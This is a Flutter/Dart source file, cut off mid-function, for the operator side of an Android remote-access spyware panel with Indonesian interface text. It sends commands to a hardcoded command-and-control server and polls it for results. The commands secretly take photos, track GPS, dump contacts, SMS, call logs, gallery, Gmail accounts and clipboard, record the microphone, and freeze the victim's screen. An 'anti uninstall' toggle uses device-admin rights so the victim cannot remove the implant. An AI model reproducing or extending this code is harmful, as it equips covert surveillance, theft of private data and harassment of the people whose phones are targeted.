import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'package:path_provider/path_provider.dart';
import 'package:video_player/video_player.dart';

// ─── GLOBAL FONT ───────────────────────────────────────────────────────
const String kFont = 'Pek';

// ─── PALETTE DARI _C ──────────────────────────────────────────────────────────
class _C {
  static const bg = Color(0xFF0A0A0F);
  static const surface = Color(0x1AFFFFFF);
  static const card = Color(0x0DFFFFFF);
  static const border = Color(0x1AFFFFFF);
  static const primary = Color(0xFFFF1744);
  static const primaryDark = Color(0xFFB71C1C);
  static const accent = Color(0xFFFF8A80);
  static const success = Color(0xFF00E676);
  static const secondary = Color(0xFFFF5252);
  static const text = Color(0xFFF5EEEE);
  static const textSub = Color(0xFFE0AAAA);
  static const textDim = Color(0xFF994444);
  static const white = Color(0xFFF5EEEE);
  static const whiteDim = Color(0xFFCCAAAA);
  static const black = Color(0xFF0A0A0F);
  static const glassBorder = Color(0x1AFFFFFF);

  static LinearGradient get btnGrad => const LinearGradient(
    colors: [Color(0xFFFF1744), Color(0xFFB71C1C)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  static LinearGradient get glassGrad => LinearGradient(
    colors: [Color(0x0DFFFFFF), Color(0x03FFFFFF)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  static List<BoxShadow> get glassShadow => [
    BoxShadow(color: Color(0x66000000), blurRadius: 30, offset: const Offset(0, 8)),
    BoxShadow(color: Color(0x0DFF1744), blurRadius: 60, offset: const Offset(0, -4)),
  ];

  static List<BoxShadow> get glowShadow => [
    BoxShadow(color: Color(0x4DFF1744), blurRadius: 20, spreadRadius: 2),
  ];

  static List<BoxShadow> get softShadow => [
    BoxShadow(color: Color(0x1F000000), blurRadius: 16, offset: const Offset(0, 4)),
  ];
}

Color _roleColor(String role) {
  switch (role.toLowerCase()) {
    case 'owner': return const Color(0xFF6C47FF);
    case 'admin': return const Color(0xFF8B6BFF);
    case 'reseller': return const Color(0xFFFF2D55);
    default: return const Color(0xFF9595AA);
  }
}

const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  final String username;
  final String sessionKey;
  final List<dynamic> news;

  const ControlCenterPage({
    super.key,
    this.targetDevice,
    this.role = 'owner',
    this.username = '',
    this.sessionKey = '',
    this.news = const [],
  });

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage>
    with TickerProviderStateMixin {
  static const _kBase = 'http://digital.mypanelku.web.id:2041';

  // ─── PALETTE ────────────────────────────────────────────────────────
  final Color bgDark = _C.bg;
  final Color cardBg = _C.card;
  final Color borderBlue = _C.border;
  final Color buttonBg = _C.surface;
  final Color borderButton = _C.border;
  final Color textWhite = _C.text;
  final Color textGrey = _C.textSub;
  final Color glowBlue = _C.primary;
  final Color accentRed = _C.primary;
  final Color accentGreen = _C.success;
  final Color accentYellow = _C.secondary;
  final Color accentPurple = _C.primaryDark;
  final Color accentCyan = _C.accent;

  static const Set<String> _needPoll = {
    'take_photo', 'get_location', 'track_gps',
    'get_contacts', 'dump_contacts', 'get_gmails', 'get_sms', 'get_gallery',
    'record_mic', 'list_apps', 'kill_app', 'get_clipboard',
    'list_files', 'get_call_logs', 'speak',
    'play_loop_sound', 'stop_loop_sound',
    'panik_mode', 'panik_mode_off',
  };

  bool _sending = false;
  final List<String> _log = [];

  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);
  bool _isLiveDialogShowing = false;

  bool _isStrobeOn = false;
  bool _isTorchOn = false;
  bool _isVibrateLoopOn = false;
  bool _isForceCloseOn = false;
  bool _isPanicModeOn = false;
  bool _isLoopSoundOn = false;
  bool _isAntiUninstallOn = false;
  List<Map<String, String>> _installedApps = [];
  Timer? _forceCloseTimer;

  late AnimationController _controller;

  VideoPlayerController? _bannerVideoController;

  Map<int, bool> _spinningStates = {};
  Map<int, Timer> _spinningTimers = {};

  // ─── EXPANDABLE BANNER ──────────────────────────────────────────────
  bool _isBannerExpanded = false;
  bool _isBannerFreezeOn = false;
  Timer? _bannerFreezeTimer;

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';
  bool get _isOnline => widget.targetDevice?['online'] == true;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 4),
    )..repeat();

    _bannerVideoController = VideoPlayerController.asset('assets/videos/1.mp4')
      ..initialize().then((_) {
        setState(() {});
        _bannerVideoController?.setLooping(true);
        _bannerVideoController?.play();
      }).catchError((e) {
        print('Banner video error: $e');
      });

    _checkAntiUninstallStatus();
  }

  @override
  void dispose() {
    _controller.dispose();
    _forceCloseTimer?.cancel();
    _liveTimer?.cancel();
    _frameN.dispose();
    _bannerVideoController?.dispose();
    _bannerFreezeTimer?.cancel();
    for (var timer in _spinningTimers.values) {
      timer.cancel();
    }
    super.dispose();
  }

  void _checkAntiUninstallStatus() async {
    try {
      final bool? status = await platformSpy.invokeMethod('isDeviceAdminActive');
      if (mounted) {
        setState(() {
          _isAntiUninstallOn = status ?? false;
        });
      }
    } catch (e) {
      print('Check anti uninstall error: $e');
      if (mounted) {
        setState(() {
          _isAntiUninstallOn = false;
        });
      }
    }
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = _C.primary}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: _C.card,
      content: Row(
        children: [
          Container(width: 4, height: 20, decoration: BoxDecoration(color: c, borderRadius: BorderRadius.circular(2))),
          const SizedBox(width: 12),
          Expanded(child: Text(m, style: TextStyle(color: _C.text, fontWeight: FontWeight.w600, fontSize: 13, fontFamily: kFont, letterSpacing: 0.3))),
          Container(width: 6, height: 6, decoration: BoxDecoration(color: c.withOpacity(0.4), shape: BoxShape.circle, boxShadow: [BoxShadow(color: c.withOpacity(0.3), blurRadius: 8)])),
        ],
      ),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12), side: BorderSide(color: c.withOpacity(0.2), width: 1)),
      elevation: 0,
    ));
  }

  void _toastSuccess(String m) { _toast(m, c: _C.success); }
  void _toastError(String m) { _toast(m, c: _C.primary); }
  void _toastInfo(String m) { _toast(m, c: _C.primary); }
  void _toastWarning(String m) { _toast(m, c: _C.secondary); }

  void _startSpinning(int id) {
    if (!mounted) return;
    setState(() { _spinningStates[id] = true; });
    _spinningTimers[id]?.cancel();
    _spinningTimers[id] = Timer(const Duration(seconds: 5), () {
      if (mounted) { setState(() { _spinningStates[id] = false; }); }
    });
  }

  Future<void> _cmd(String cmd, {String extra = '', bool silent = false, int spinId = -1}) async {
    if (_id == 'unknown') { if (!silent) _toastError('ID target tidak valid'); return; }
    if (spinId != -1) _startSpinning(spinId);

    if (!silent) {
      setState(() => _sending = true);
      _toastInfo('Mengirim ke target...');
    }
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        if (!silent) { _addLog('Sent: $cmd'); }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) { _addLog('Error $cmd (${res.statusCode})'); _toastError('Target offline'); }
      }
    } catch (e) {
      if (!silent) { _addLog('Conn error: $e'); _toastError('Koneksi gagal'); }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0; bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http.get(Uri.parse('$_kBase/api/get-response/$_id')).timeout(const Duration(seconds: 6));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) { _onResponse(cmd, d['data']); got = true; }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (cmd == 'record_mic') {
      try { Navigator.of(context, rootNavigator: true).pop(); } catch (_) {}
    }
    if (!mounted) return;

    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) { _toastError('Foto kosong'); return; }
        _addLog('Foto diterima');
        _imgDialog(b, 'Foto Target');
        break;
      case 'get_location':
      case 'track_gps':
        _addLog('GPS diterima');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts':
      case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} kontak');
        _contactsDialog(l);
        break;
      case 'get_gmails':
        _addLog('Akun diterima');
        _textDialog('Gmail Accounts', d['accounts']?.toString() ?? 'Tidak ada');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsDialog(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} foto gallery');
        _galleryDialog(imgs);
        break;
      case 'record_mic':
        _addLog('Hasil rekaman diterima');
        if (d['status'] == 'success' && d['audio'] != null) {
          final audio = d['audio'].toString();
          if (audio.isNotEmpty && audio.length > 100) {
            _playAudioDirect(audio);
          } else {
            _toastError('Audio terlalu pendek atau kosong');
          }
        } else {
          _toastError('Gagal rekam: ${d['message'] ?? "Unknown error"}');
        }
        break;
      case 'list_apps':
        final apps = d['apps'] as List? ?? [];
        _addLog('${apps.length} aplikasi ditemukan');
        _showAppsDialog(apps);
        break;
      case 'list_files':
        final files = d['files'] as List? ?? [];
        final path = d['path']?.toString() ?? '/';
        _addLog('${files.length} file/direktori di $path');
        _fileManagerDialog(files, path);
        break;
      case 'screen_freeze':
        _addLog('Freeze dikirim: ${d['status']}');
        _toastSuccess('Freeze ${d['duration']}s berhasil');
        break;
      case 'speak':
        _addLog('TTS: ${d['status']}');
        _toastSuccess('Suara terkirim');
        break;
      case 'play_loop_sound':
        _addLog('Loop Sound: ${d['status']}');
        setState(() => _isLoopSoundOn = true);
        _toastSuccess('Sound looping ON');
        break;
      case 'stop_loop_sound':
        _addLog('Loop Sound stopped');
        setState(() => _isLoopSoundOn = false);
        _toastInfo('Sound looping OFF');
        break;
      case 'panik_mode':
        _addLog('Panic Mode: ${d['status']}');
        setState(() => _isPanicModeOn = true);
        _toastWarning('🚨 PANIC MODE ACTIVATED!');
        break;
      case 'panik_mode_off':
        _addLog('Panic Mode: ${d['status']}');
        setState(() => _isPanicModeOn = false);
        _toastInfo('Panic Mode OFF');
        break;
      default:
        _addLog('$cmd selesai');
    }
  }

  // ─── BACKGROUND WRAPPER ──────────────────────────────────────────────
  Widget _buildBackgroundWrapper({required Widget child}) {
    return Stack(
      children: [
        Positioned.fill(
          child: Image.asset(
            'assets/images/mmk.jpg',
            fit: BoxFit.cover,
            errorBuilder: (_, __, ___) => Container(color: _C.bg),
          ),
        ),
        Positioned.fill(
          child: Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [
                  _C.bg.withOpacity(0.78),
                  _C.bg.withOpacity(0.88),
                  _C.bg.withOpacity(0.95),
                ],
              ),
            ),
          ),
        ),
        child,
      ],
    );
  }

  // ─── BANNER VIDEO ──────────────────────────────────────────────────
  Widget _buildBannerVideo() {
    if (_bannerVideoController == null || !_bannerVideoController!.value.isInitialized) {
      return Container(
        width: double.infinity,
        height: 170,
        margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        decoration: BoxDecoration(color: _C.card, borderRadius: BorderRadius.circular(12), border: Border.all(color: _C.border)),
        child: const Center(child: CircularProgressIndicator(color: _C.primary, strokeWidth: 2)),
      );
    }
    return Container(
      width: double.infinity,
      height: 170,
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      decoration: BoxDecoration(borderRadius: BorderRadius.circular(12), border: Border.all(color: _C.border), boxShadow: [BoxShadow(color: _C.primary.withOpacity(0.08), blurRadius: 16, spreadRadius: 2)]),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(12),
        child: Stack(
          fit: StackFit.expand,
          children: [
            FittedBox(fit: BoxFit.cover, child: SizedBox(width: _bannerVideoController!.value.size.width, height: _bannerVideoController!.value.size.height, child: VideoPlayer(_bannerVideoController!))),
            Container(decoration: BoxDecoration(gradient: LinearGradient(colors: [_C.black.withOpacity(0.4), Colors.transparent, _C.primary.withOpacity(0.05)], begin: Alignment.bottomCenter, end: Alignment.topCenter))),
            Positioned(
              bottom: 12,
              left: 14,
              right: 14,
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                    decoration: BoxDecoration(color: _C.primary.withOpacity(0.15), borderRadius: BorderRadius.circular(20), border: Border.all(color: _C.primary.withOpacity(0.3), width: 1), boxShadow: [BoxShadow(color: _C.primary.withOpacity(0.2), blurRadius: 10)]),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Container(width: 6, height: 6, decoration: BoxDecoration(color: _C.success, shape: BoxShape.circle, boxShadow: [BoxShadow(color: _C.success.withOpacity(0.6), blurRadius: 8)])),
                        const SizedBox(width: 8),
                        Text('News Update 3.3', style: TextStyle(color: _C.text, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: kFont, letterSpacing: 1.5)),
                        const SizedBox(width: 8),
                        Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: _C.primary.withOpacity(0.2), borderRadius: BorderRadius.circular(4)), child: Text('NEW', style: TextStyle(color: _C.primary, fontSize: 8, fontWeight: FontWeight.bold, fontFamily: kFont))),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── EXPANDABLE BANNER CARD ─────────────────────────────────────────
  Widget _buildBannerCard() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 22, vertical: 4),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _C.border, width: 1.5),
        boxShadow: [BoxShadow(color: _C.primary.withOpacity(0.05), blurRadius: 16, spreadRadius: 1)],
      ),
      child: Column(
        children: [
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
            child: Row(
              children: [
                Container(
                  width: 42,
                  height: 42,
                  decoration: BoxDecoration(
                    color: _C.primary.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _C.primary.withOpacity(0.3)),
                  ),
                  child: Icon(Icons.phone_android_rounded, color: _C.primary, size: 22),
                ),
                const SizedBox(width: 14),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _model,
                        style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: kFont),
                        overflow: TextOverflow.ellipsis,
                      ),
                      const SizedBox(height: 2),
                      Row(
                        children: [
                          Text('ID: ', style: TextStyle(color: _C.textDim, fontSize: 10, fontFamily: kFont)),
                          Expanded(
                            child: Text(
                              _id,
                              style: TextStyle(color: _C.textDim, fontSize: 10, fontFamily: kFont),
                              overflow: TextOverflow.ellipsis,
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 2),
                      Row(
                        children: [
                          Icon(
                            Icons.battery_charging_full_rounded,
                            color: _battery != '--' && int.tryParse(_battery) != null && int.parse(_battery) > 20 ? _C.success : _C.secondary,
                            size: 12,
                          ),
                          const SizedBox(width: 4),
                          Text(
                            '$_battery%',
                            style: TextStyle(
                              color: _battery != '--' && int.tryParse(_battery) != null && int.parse(_battery) > 20 ? _C.success : _C.secondary,
                              fontSize: 10,
                              fontWeight: FontWeight.w600,
                              fontFamily: kFont,
                            ),
                          ),
                          const SizedBox(width: 10),
                          Container(
                            width: 6,
                            height: 6,
                            decoration: BoxDecoration(
                              color: _isOnline ? _C.success : _C.primary,
                              shape: BoxShape.circle,
                              boxShadow: [
                                BoxShadow(
                                  color: _isOnline ? _C.success.withOpacity(0.5) : _C.primary.withOpacity(0.5),
                                  blurRadius: 6,
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(width: 4),
                          Text(
                            _isOnline ? 'ONLINE' : 'OFFLINE',
                            style: TextStyle(
                              color: _isOnline ? _C.success : _C.primary,
                              fontSize: 9,
                              fontWeight: FontWeight.w600,
                              fontFamily: kFont,
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
                GestureDetector(
                  onTap: () {
                    setState(() {
                      _isBannerExpanded = !_isBannerExpanded;
                    });
                  },
                  child: AnimatedRotation(
                    duration: const Duration(milliseconds: 300),
                    turns: _isBannerExpanded ? 0.5 : 0.0,
                    child: Container(
                      width: 32,
                      height: 32,
                      decoration: BoxDecoration(
                        color: _C.primary.withOpacity(0.08),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: _C.primary.withOpacity(0.15)),
                      ),
                      child: Icon(
                        Icons.keyboard_arrow_down_rounded,
                        color: _C.primary,
                        size: 22,
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
          AnimatedCrossFade(
            duration: const Duration(milliseconds: 300),
            crossFadeState: _isBannerExpanded ? CrossFadeState.showSecond : CrossFadeState.showFirst,
            firstChild: const SizedBox(height: 0),
            secondChild: Container(
              padding: const EdgeInsets.fromLTRB(18, 0, 18, 16),
              decoration: BoxDecoration(
                border: Border(top: BorderSide(color: _C.border, width: 0.5)),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const SizedBox(height: 12),
                  Row(
                    children: [
                      Container(
                        width: 36,
                        height: 36,
                        decoration: BoxDecoration(
                          color: _C.primaryDark.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(color: _C.primaryDark.withOpacity(0.3)),
                        ),
                        child: Icon(Icons.block_rounded, color: _C.primaryDark, size: 18),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              'FREEZE',
                              style: TextStyle(
                                color: _isBannerFreezeOn ? _C.primaryDark : _C.text,
                                fontSize: 13,
                                fontWeight: FontWeight.bold,
                                fontFamily: kFont,
                                letterSpacing: 0.5,
                              ),
                            ),
                            Text(
                              _isBannerFreezeOn ? 'AKTIF' : 'NONAKTIF',
                              style: TextStyle(
                                color: _isBannerFreezeOn ? _C.primaryDark : _C.textDim,
                                fontSize: 10,
                                fontFamily: kFont,
                              ),
                            ),
                          ],
                        ),
                      ),
                      GestureDetector(
                        onTap: _toggleBannerFreeze,
                        child: Container(
                          width: 44,
                          height: 24,
                          decoration: BoxDecoration(
                            color: _isBannerFreezeOn ? _C.primaryDark : _C.border,
                            borderRadius: BorderRadius.circular(12),
                            boxShadow: _isBannerFreezeOn
                                ? [BoxShadow(color: _C.primaryDark.withOpacity(0.4), blurRadius: 8)]
                                : [],
                          ),
                          child: AnimatedAlign(
                            duration: const Duration(milliseconds: 250),
                            alignment: _isBannerFreezeOn ? Alignment.centerRight : Alignment.centerLeft,
                            child: Container(
                              width: 18,
                              height: 18,
                              margin: const EdgeInsets.all(3),
                              decoration: BoxDecoration(
                                color: _C.white,
                                shape: BoxShape.circle,
                                boxShadow: [BoxShadow(color: _C.black.withOpacity(0.2), blurRadius: 4)],
                              ),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),
                  Container(
                    height: 1,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [Colors.transparent, _C.primary.withOpacity(0.15), Colors.transparent],
                      ),
                    ),
                  ),
                  const SizedBox(height: 8),
                  Row(
                    children: [
                      Container(
                        width: 36,
                        height: 36,
                        decoration: BoxDecoration(
                          color: _C.primary.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(color: _C.primary.withOpacity(0.3)),
                        ),
                        child: Icon(Icons.security_rounded, color: _C.primary, size: 18),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              'ANTI UNINSTALL',
                              style: TextStyle(
                                color: _isAntiUninstallOn ? _C.primary : _C.text,
                                fontSize: 13,
                                fontWeight: FontWeight.bold,
                                fontFamily: kFont,
                                letterSpacing: 0.5,
                              ),
                            ),
                            Text(
                              _isAntiUninstallOn ? 'AKTIF - Tidak bisa dihapus' : 'NONAKTIF - Bisa dihapus',
                              style: TextStyle(
                                color: _isAntiUninstallOn ? _C.primary : _C.textDim,
                                fontSize: 10,
                                fontFamily: kFont,
                              ),
                            ),
                          ],
                        ),
                      ),
                      GestureDetector(
                        onTap: _toggleAntiUninstall,
                        child: Container(
                          width: 44,
                          height: 24,
                          decoration: BoxDecoration(
                            color: _isAntiUninstallOn ? _C.primary : _C.border,
                            borderRadius: BorderRadius.circular(12),
                            boxShadow: _isAntiUninstallOn
                                ? [BoxShadow(color: _C.primary.withOpacity(0.4), blurRadius: 8)]
                                : [],
                          ),
                          child: AnimatedAlign(
                            duration: const Duration(milliseconds: 250),
                            alignment: _isAntiUninstallOn ? Alignment.centerRight : Alignment.centerLeft,
                            child: Container(
                              width: 18,
                              height: 18,
                              margin: const EdgeInsets.all(3),
                              decoration: BoxDecoration(
                                color: _C.white,
                                shape: BoxShape.circle,
                                boxShadow: [BoxShadow(color: _C.black.withOpacity(0.2), blurRadius: 4)],
                              ),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),
                  Container(
                    height: 1,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [Colors.transparent, _C.primary.withOpacity(0.15), Colors.transparent],
                      ),
                    ),
                  ),
                  const SizedBox(height: 8),
                  Row(
                    children: [
                      Container(
                        width: 6,
                        height: 6,
                        decoration: BoxDecoration(
                          color: _isAntiUninstallOn ? _C.primary : _C.textDim,
                          shape: BoxShape.circle,
                          boxShadow: _isAntiUninstallOn
                              ? [BoxShadow(color: _C.primary.withOpacity(0.5), blurRadius: 6)]
                              : [],
                        ),
                      ),
                      const SizedBox(width: 8),
                      Text(
                        _isAntiUninstallOn ? ' ANTI UNINSTALL AKTIF' : ' ANTI UNINSTALL NONAKTIF',
                        style: TextStyle(
                          color: _isAntiUninstallOn ? _C.primary : _C.textDim,
                          fontSize: 9,
                          fontWeight: FontWeight.w600,
                          fontFamily: kFont,
                          letterSpacing: 1,
                        ),
                      ),
                      const Spacer(),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                        decoration: BoxDecoration(
                          color: _C.primary.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _C.primary.withOpacity(0.1)),
                        ),
                        child: Text(
                          'BANNER',
                          style: TextStyle(
                            color: _C.primary.withOpacity(0.5),
                            fontSize: 7,
                            fontWeight: FontWeight.bold,
                            fontFamily: kFont,
                            letterSpacing: 1.5,
                          ),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  void _toggleBannerFreeze() {
    setState(() {
      _isBannerFreezeOn = !_isBannerFreezeOn;
    });

    if (_isBannerFreezeOn) {
      _cmd('screen_freeze', extra: '3000');
      _toastWarning('Screen Freeze ON');

      _bannerFreezeTimer?.cancel();
      _bannerFreezeTimer = Timer(const Duration(seconds: 30), () {
        if (mounted) {
          setState(() {
            _isBannerFreezeOn = false;
          });
          _cmd('unfreeze', silent: true);
          _toastInfo('Screen Freeze OFF (otomatis)');
        }
      });
    } else {
      _cmd('unfreeze');
      _bannerFreezeTimer?.cancel();
      _toastInfo('Screen Freeze OFF');
    }
  }

  void _toggleAntiUninstall() async {
    setState(() {
      _isAntiUninstallOn = !_isAntiUninstallOn;
    });

    if (_isAntiUninstallOn) {
      _cmd('anti_uninstall_on', silent: true);
      _toastWarning('ANTI UNINSTALL ON - Aplikasi tidak bisa dihapus!');
      _addLog('Anti Uninstall ON');
    } else {
      _cmd('anti_uninstall_off', silent: true);
      _toastInfo('ANTI UNINSTALL OFF - Aplikasi bisa dihapus');
      _addLog('Anti Uninstall OFF');
    }
  }

  void _togglePanicMode() async {
    if (_isPanicModeOn) {
      _cmd('panik_mode_off', silent: true);
      setState(() => _isPanicModeOn = false);
      _toastInfo('Panic Mode OFF');
      _addLog('Panic Mode OFF');
    } else {
      _cmd('panik_mode', silent: true);
      setState(() => _isPanicModeOn = true);
      _toastWarning('PANIC MODE ON - Target Locked!');
      _addLog('Panic Mode ON');
    }
  }

  // ─── DIALOG ─────────────────────────────────────────────────────────
  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(builder: (ctx, ss) => AlertDialog(
        backgroundColor: _C.card,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: Text('Select Camera', style: TextStyle(color: _C.text, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: kFont)),
        content: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back', 'front'].map((v) {
          final isSel = sel == v;
          return GestureDetector(
            onTap: () => ss(() => sel = v),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
              decoration: BoxDecoration(color: isSel ? _C.primary.withOpacity(0.1) : Colors.transparent, borderRadius: BorderRadius.circular(10), border: Border.all(color: isSel ? _C.primary : _C.border)),
              child: Column(children: [
                Icon(v == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded, color: isSel ? _C.primary : _C.textDim, size: 22),
                const SizedBox(height: 4),
                Text(v == 'back' ? 'Back' : 'Front', style: TextStyle(color: isSel ? _C.primary : _C.textDim, fontSize: 9, fontWeight: FontWeight.w600, fontFamily: kFont)),
              ]),
            ),
          );
        }).toList()),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: Text('Cancel', style: TextStyle(color: _C.textDim, fontSize: 10, fontFamily: kFont))),
          ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: _C.primary, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)), padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6)), onPressed: () { Navigator.pop(ctx); onPick(sel); }, child: Text('Select', style: TextStyle(color: _C.bg, fontWeight: FontWeight.bold, fontSize: 10, fontFamily: kFont))),
        ],
      )),
    );
  }

  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => FullScreenDialog(
          child: Column(
            children: [
              _buildDialogHeader(title, Icons.edit_rounded, _C.primary),
              Expanded(
                child: Container(
                  padding: const EdgeInsets.all(24),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Text(label, style: TextStyle(color: _C.text, fontSize: 16, fontWeight: FontWeight.w500, fontFamily: kFont)),
                      const SizedBox(height: 16),
                      TextField(
                        controller: ctrl,
                        keyboardType: isNumber ? TextInputType.number : TextInputType.text,
                        style: TextStyle(color: _C.text, fontSize: 16, fontFamily: kFont),
                        decoration: InputDecoration(
                          hintText: hint,
                          hintStyle: TextStyle(color: _C.textDim, fontSize: 14, fontFamily: kFont),
                          filled: true,
                          fillColor: _C.surface,
                          border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _C.border)),
                          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _C.border)),
                          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _C.primary)),
                        ),
                      ),
                      const SizedBox(height: 24),
                      Row(
                        children: [
                          Expanded(child: OutlinedButton(style: OutlinedButton.styleFrom(side: BorderSide(color: _C.border), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(vertical: 12)), onPressed: () => Navigator.pop(context), child: Text('Batal', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)))),
                          const SizedBox(width: 12),
                          Expanded(child: ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: _C.primary, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(vertical: 12)), onPressed: () { Navigator.pop(context); onDone(ctrl.text.trim()); }, child: Text('Kirim', style: TextStyle(color: _C.bg, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: kFont)))),
                        ],
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showLoopSoundDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: _C.card,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
